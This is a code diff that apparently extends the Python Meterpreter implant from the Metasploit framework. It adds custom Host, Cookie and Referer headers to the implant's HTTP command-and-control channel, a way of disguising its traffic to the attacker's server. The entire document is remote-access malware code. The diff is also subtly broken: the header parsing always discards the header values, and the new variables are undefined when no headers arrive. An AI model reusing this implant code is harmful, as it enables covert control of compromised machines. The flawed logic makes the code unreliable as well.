@@ -64,6 +64,9 @@ TRY_TO_FORK = True
 HTTP_CONNECTION_URL = None
 HTTP_PROXY = None
 HTTP_USER_AGENT = None
+HTTP_COOKIE = None
+HTTP_HOST = None
+HTTP_REFERER = None
 PAYLOAD_UUID = ''
 SESSION_GUID = ''
 SESSION_COMMUNICATION_TIMEOUT = 300
@@ -155,7 +158,8 @@ TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
 TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
 TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
 TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
-TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 441
+TLV_TYPE_TRANS_HEADERS         = TLV_META_TYPE_STRING  | 441
+TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 442
 
 TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
 TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
@@ -494,7 +498,18 @@ class Transport(object):
 		elif url.startswith('http'):
 			proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
 			user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
-			transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
+			http_headers = packet_get_tlv(request, TLV_TYPE_TRANS_HEADERS).get('value', None)
+			if http_headers:
+				headers = {}
+				for h in http_headers.strip().split("\r\n"):
+					p = h.split(':')
+					headers[p[0].upper()] = ''.join(p[1:0])
+				http_host = headers.get('HOST')
+				http_cookie = headers.get('COOKIE')
+				http_referer = headers.get('REFERER')
+
+			transport = HttpTransport(url, proxy=proxy, user_agent=user_agent, http_host=http_host,
+					http_cookie=http_cookie, http_referer=http_referer)
 		transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
 		transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
 		transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
@@ -580,7 +595,7 @@ class Transport(object):
 		return trans_group
 
 class HttpTransport(Transport):
-	def __init__(self, url, proxy=None, user_agent=None):
+	def __init__(self, url, proxy=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
 		super(HttpTransport, self).__init__()
 		opener_args = []
 		scheme = url.split(':', 1)[0]
@@ -594,12 +609,19 @@ class HttpTransport(Transport):
 			opener_args.append(urllib.ProxyHandler({scheme: proxy}))
 		self.proxy = proxy
 		opener = urllib.build_opener(*opener_args)
+		opener.addheaders = []
 		if user_agent:
-			opener.addheaders = [('User-Agent', user_agent)]
+			opener.addheaders.append(('User-Agent', user_agent))
+		if http_cookie:
+			opener.addheaders.append(('Cookie', http_cookie))
+		if http_referer:
+			opener.addheaders.append(('Referer', http_referer))
 		self.user_agent = user_agent
 		urllib.install_opener(opener)
 		self.url = url
 		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
+		if http_host:
+			self._http_request_headers['Host'] = http_host
 		self._first_packet = None
 		self._empty_cnt = 0
 
@@ -1246,7 +1268,8 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
 		except OSError:
 			pass
 	if HTTP_CONNECTION_URL and has_urllib:
-		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
+		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
+				http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
 	else:
 		# PATCH-SETUP-STAGELESS-TCP-SOCKET #
 		transport = TcpTransport.from_socket(s)
